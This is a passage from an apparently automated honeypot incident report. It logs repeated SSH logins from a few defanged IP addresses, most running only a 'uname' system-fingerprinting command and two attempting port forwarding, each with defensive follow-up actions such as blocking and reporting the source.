| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:53:53` | `cowrie.session.connect` |
| `2026-07-19 09:53:54` | `cowrie.client.version` |
| `2026-07-19 09:53:54` | `cowrie.client.kex` |
| `2026-07-19 09:53:57` | `cowrie.login.success` |
| `2026-07-19 09:54:01` | `cowrie.session.params` |
| `2026-07-19 09:54:01` | `cowrie.command.input` |
| `2026-07-19 09:54:02` | `cowrie.log.closed` |
| `2026-07-19 09:54:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cee0c2c701f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:53 |
| **Last Seen** | 2026-07-19 09:54 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:53:59` | `cowrie.session.connect` |
| `2026-07-19 09:54:01` | `cowrie.client.version` |
| `2026-07-19 09:54:01` | `cowrie.client.kex` |
| `2026-07-19 09:54:07` | `cowrie.login.success` |
| `2026-07-19 09:54:11` | `cowrie.session.params` |
| `2026-07-19 09:54:11` | `cowrie.command.input` |
| `2026-07-19 09:54:12` | `cowrie.log.closed` |
| `2026-07-19 09:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07a33e5d11cf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:54 |
| **Last Seen** | 2026-07-19 09:54 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:54:06` | `cowrie.session.connect` |
| `2026-07-19 09:54:08` | `cowrie.client.version` |
| `2026-07-19 09:54:08` | `cowrie.client.kex` |
| `2026-07-19 09:54:12` | `cowrie.login.success` |
| `2026-07-19 09:54:16` | `cowrie.session.params` |
| `2026-07-19 09:54:16` | `cowrie.command.input` |
| `2026-07-19 09:54:17` | `cowrie.log.closed` |
| `2026-07-19 09:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cc66a2f37b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:54 |
| **Last Seen** | 2026-07-19 09:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:54:16` | `cowrie.session.connect` |
| `2026-07-19 09:54:16` | `cowrie.client.version` |
| `2026-07-19 09:54:16` | `cowrie.client.kex` |
| `2026-07-19 09:54:20` | `cowrie.login.success` |
| `2026-07-19 09:54:23` | `cowrie.session.params` |
| `2026-07-19 09:54:23` | `cowrie.command.input` |
| `2026-07-19 09:54:24` | `cowrie.log.closed` |
| `2026-07-19 09:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d80041e3906

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:54 |
| **Last Seen** | 2026-07-19 09:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:54:22` | `cowrie.session.connect` |
| `2026-07-19 09:54:23` | `cowrie.client.version` |
| `2026-07-19 09:54:23` | `cowrie.client.kex` |
| `2026-07-19 09:54:27` | `cowrie.login.success` |
| `2026-07-19 09:54:29` | `cowrie.session.params` |
| `2026-07-19 09:54:29` | `cowrie.command.input` |
| `2026-07-19 09:54:29` | `cowrie.log.closed` |
| `2026-07-19 09:54:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31a882811b67

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:54 |
| **Last Seen** | 2026-07-19 09:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:54:32` | `cowrie.session.connect` |
| `2026-07-19 09:54:32` | `cowrie.client.version` |
| `2026-07-19 09:54:32` | `cowrie.client.kex` |
| `2026-07-19 09:54:34` | `cowrie.login.success` |
| `2026-07-19 09:54:35` | `cowrie.session.params` |
| `2026-07-19 09:54:35` | `cowrie.command.input` |
| `2026-07-19 09:54:36` | `cowrie.log.closed` |
| `2026-07-19 09:54:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4382e1eb132

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:54 |
| **Last Seen** | 2026-07-19 09:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:54:41` | `cowrie.session.connect` |
| `2026-07-19 09:54:41` | `cowrie.client.version` |
| `2026-07-19 09:54:41` | `cowrie.client.kex` |
| `2026-07-19 09:54:42` | `cowrie.login.success` |
| `2026-07-19 09:54:43` | `cowrie.session.params` |
| `2026-07-19 09:54:43` | `cowrie.command.input` |
| `2026-07-19 09:54:43` | `cowrie.log.closed` |
| `2026-07-19 09:54:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9767ab39f17d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:54 |
| **Last Seen** | 2026-07-19 09:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:54:51` | `cowrie.session.connect` |
| `2026-07-19 09:54:51` | `cowrie.client.version` |
| `2026-07-19 09:54:51` | `cowrie.client.kex` |
| `2026-07-19 09:54:53` | `cowrie.login.success` |
| `2026-07-19 09:54:55` | `cowrie.session.params` |
| `2026-07-19 09:54:55` | `cowrie.command.input` |
| `2026-07-19 09:54:55` | `cowrie.log.closed` |
| `2026-07-19 09:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f24e62b1ad36

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:55 |
| **Last Seen** | 2026-07-19 09:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:55:01` | `cowrie.session.connect` |
| `2026-07-19 09:55:01` | `cowrie.client.version` |
| `2026-07-19 09:55:01` | `cowrie.client.kex` |
| `2026-07-19 09:55:03` | `cowrie.login.success` |
| `2026-07-19 09:55:05` | `cowrie.session.params` |
| `2026-07-19 09:55:05` | `cowrie.command.input` |
| `2026-07-19 09:55:05` | `cowrie.log.closed` |
| `2026-07-19 09:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa18cc05c72a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:55 |
| **Last Seen** | 2026-07-19 09:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:55:12` | `cowrie.session.connect` |
| `2026-07-19 09:55:12` | `cowrie.client.version` |
| `2026-07-19 09:55:12` | `cowrie.client.kex` |
| `2026-07-19 09:55:13` | `cowrie.login.success` |
| `2026-07-19 09:55:14` | `cowrie.session.params` |
| `2026-07-19 09:55:14` | `cowrie.command.input` |
| `2026-07-19 09:55:14` | `cowrie.log.closed` |
| `2026-07-19 09:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44cc4659fe7a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:55 |
| **Last Seen** | 2026-07-19 09:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:55:21` | `cowrie.session.connect` |
| `2026-07-19 09:55:21` | `cowrie.client.version` |
| `2026-07-19 09:55:21` | `cowrie.client.kex` |
| `2026-07-19 09:55:22` | `cowrie.login.success` |
| `2026-07-19 09:55:23` | `cowrie.session.params` |
| `2026-07-19 09:55:23` | `cowrie.command.input` |
| `2026-07-19 09:55:23` | `cowrie.log.closed` |
| `2026-07-19 09:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f5e524e461

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:55 |
| **Last Seen** | 2026-07-19 09:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:55:30` | `cowrie.session.connect` |
| `2026-07-19 09:55:30` | `cowrie.client.version` |
| `2026-07-19 09:55:30` | `cowrie.client.kex` |
| `2026-07-19 09:55:32` | `cowrie.login.success` |
| `2026-07-19 09:55:33` | `cowrie.session.params` |
| `2026-07-19 09:55:33` | `cowrie.command.input` |
| `2026-07-19 09:55:34` | `cowrie.log.closed` |
| `2026-07-19 09:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6e98691eea1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:55 |
| **Last Seen** | 2026-07-19 09:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:55:39` | `cowrie.session.connect` |
| `2026-07-19 09:55:39` | `cowrie.client.version` |
| `2026-07-19 09:55:39` | `cowrie.client.kex` |
| `2026-07-19 09:55:40` | `cowrie.login.success` |
| `2026-07-19 09:55:41` | `cowrie.session.params` |
| `2026-07-19 09:55:41` | `cowrie.command.input` |
| `2026-07-19 09:55:42` | `cowrie.log.closed` |
| `2026-07-19 09:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff7c3721ea8d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-19 09:55 |
| **Last Seen** | 2026-07-19 09:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:55:47` | `cowrie.session.connect` |
| `2026-07-19 09:55:47` | `cowrie.client.version` |
| `2026-07-19 09:55:47` | `cowrie.client.kex` |
| `2026-07-19 09:55:48` | `cowrie.login.success` |
| `2026-07-19 09:55:48` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:55:48` | `cowrie.direct-tcpip.data` |
| `2026-07-19 09:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecfcbaa6833a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:55 |
| **Last Seen** | 2026-07-19 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:55:48` | `cowrie.session.connect` |
| `2026-07-19 09:55:48` | `cowrie.client.version` |
| `2026-07-19 09:55:49` | `cowrie.client.kex` |
| `2026-07-19 09:55:49` | `cowrie.login.success` |
| `2026-07-19 09:55:50` | `cowrie.session.params` |
| `2026-07-19 09:55:50` | `cowrie.command.input` |
| `2026-07-19 09:55:50` | `cowrie.log.closed` |
| `2026-07-19 09:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d10ef1154c43

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:55 |
| **Last Seen** | 2026-07-19 09:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:55:57` | `cowrie.session.connect` |
| `2026-07-19 09:55:58` | `cowrie.client.version` |
| `2026-07-19 09:55:58` | `cowrie.client.kex` |
| `2026-07-19 09:55:59` | `cowrie.login.success` |
| `2026-07-19 09:56:00` | `cowrie.session.params` |
| `2026-07-19 09:56:00` | `cowrie.command.input` |
| `2026-07-19 09:56:01` | `cowrie.log.closed` |
| `2026-07-19 09:56:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1c57e7dec92

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:56 |
| **Last Seen** | 2026-07-19 09:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:56:06` | `cowrie.session.connect` |
| `2026-07-19 09:56:06` | `cowrie.client.version` |
| `2026-07-19 09:56:06` | `cowrie.client.kex` |
| `2026-07-19 09:56:08` | `cowrie.login.success` |
| `2026-07-19 09:56:10` | `cowrie.session.params` |
| `2026-07-19 09:56:10` | `cowrie.command.input` |
| `2026-07-19 09:56:11` | `cowrie.log.closed` |
| `2026-07-19 09:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff14e3603de7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:56 |
| **Last Seen** | 2026-07-19 09:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:56:14` | `cowrie.session.connect` |
| `2026-07-19 09:56:15` | `cowrie.client.version` |
| `2026-07-19 09:56:15` | `cowrie.client.kex` |
| `2026-07-19 09:56:16` | `cowrie.login.success` |
| `2026-07-19 09:56:17` | `cowrie.session.params` |
| `2026-07-19 09:56:17` | `cowrie.command.input` |
| `2026-07-19 09:56:17` | `cowrie.log.closed` |
| `2026-07-19 09:56:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2951f2cae43

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:56 |
| **Last Seen** | 2026-07-19 09:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:56:22` | `cowrie.session.connect` |
| `2026-07-19 09:56:22` | `cowrie.client.version` |
| `2026-07-19 09:56:22` | `cowrie.client.kex` |
| `2026-07-19 09:56:23` | `cowrie.login.success` |
| `2026-07-19 09:56:24` | `cowrie.session.params` |
| `2026-07-19 09:56:24` | `cowrie.command.input` |
| `2026-07-19 09:56:24` | `cowrie.log.closed` |
| `2026-07-19 09:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aa74cf33ab6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:56 |
| **Last Seen** | 2026-07-19 09:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:56:31` | `cowrie.session.connect` |
| `2026-07-19 09:56:31` | `cowrie.client.version` |
| `2026-07-19 09:56:31` | `cowrie.client.kex` |
| `2026-07-19 09:56:33` | `cowrie.login.success` |
| `2026-07-19 09:56:35` | `cowrie.session.params` |
| `2026-07-19 09:56:35` | `cowrie.command.input` |
| `2026-07-19 09:56:35` | `cowrie.log.closed` |
| `2026-07-19 09:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-218795c1e6dd

| Field | Detail |
|---|---|
| **Source IP** | `87.225.108[.]138` |
| **First Seen** | 2026-07-19 09:56 |
| **Last Seen** | 2026-07-19 09:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:56:32` | `cowrie.session.connect` |
| `2026-07-19 09:56:32` | `cowrie.client.version` |
| `2026-07-19 09:56:32` | `cowrie.client.kex` |
| `2026-07-19 09:56:34` | `cowrie.login.success` |
| `2026-07-19 09:56:35` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.225.108[.]138` to AbuseIPDB if not already reported
- [ ] Block `87.225.108[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-798e7d7b2bc1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:56 |
| **Last Seen** | 2026-07-19 09:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:56:41` | `cowrie.session.connect` |
| `2026-07-19 09:56:42` | `cowrie.client.version` |
| `2026-07-19 09:56:42` | `cowrie.client.kex` |
| `2026-07-19 09:56:43` | `cowrie.login.success` |
| `2026-07-19 09:56:45` | `cowrie.session.params` |
| `2026-07-19 09:56:45` | `cowrie.command.input` |
| `2026-07-19 09:56:46` | `cowrie.log.closed` |
| `2026-07-19 09:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecf86b2bf196

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:56 |
| **Last Seen** | 2026-07-19 09:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:56:50` | `cowrie.session.connect` |
| `2026-07-19 09:56:51` | `cowrie.client.version` |
| `2026-07-19 09:56:51` | `cowrie.client.kex` |
| `2026-07-19 09:56:54` | `cowrie.login.success` |
| `2026-07-19 09:56:55` | `cowrie.session.params` |
| `2026-07-19 09:56:55` | `cowrie.command.input` |
| `2026-07-19 09:56:55` | `cowrie.log.closed` |
| `2026-07-19 09:56:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-694aeb4b69fb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:57 |
| **Last Seen** | 2026-07-19 09:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:57:02` | `cowrie.session.connect` |
| `2026-07-19 09:57:02` | `cowrie.client.version` |
| `2026-07-19 09:57:02` | `cowrie.client.kex` |
| `2026-07-19 09:57:05` | `cowrie.login.success` |
| `2026-07-19 09:57:07` | `cowrie.session.params` |
| `2026-07-19 09:57:07` | `cowrie.command.input` |
| `2026-07-19 09:57:08` | `cowrie.log.closed` |
| `2026-07-19 09:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9949d0fea16

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:57 |
| **Last Seen** | 2026-07-19 09:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:57:13` | `cowrie.session.connect` |
| `2026-07-19 09:57:13` | `cowrie.client.version` |
| `2026-07-19 09:57:13` | `cowrie.client.kex` |
| `2026-07-19 09:57:14` | `cowrie.login.success` |
| `2026-07-19 09:57:15` | `cowrie.session.params` |
| `2026-07-19 09:57:15` | `cowrie.command.input` |
| `2026-07-19 09:57:15` | `cowrie.log.closed` |
| `2026-07-19 09:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52ee4ccdcd85

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:57 |
| **Last Seen** | 2026-07-19 09:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:57:22` | `cowrie.session.connect` |
| `2026-07-19 09:57:23` | `cowrie.client.version` |
| `2026-07-19 09:57:23` | `cowrie.client.kex` |
| `2026-07-19 09:57:26` | `cowrie.login.success` |
| `2026-07-19 09:57:28` | `cowrie.session.params` |
| `2026-07-19 09:57:28` | `cowrie.command.input` |
| `2026-07-19 09:57:30` | `cowrie.log.closed` |
| `2026-07-19 09:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
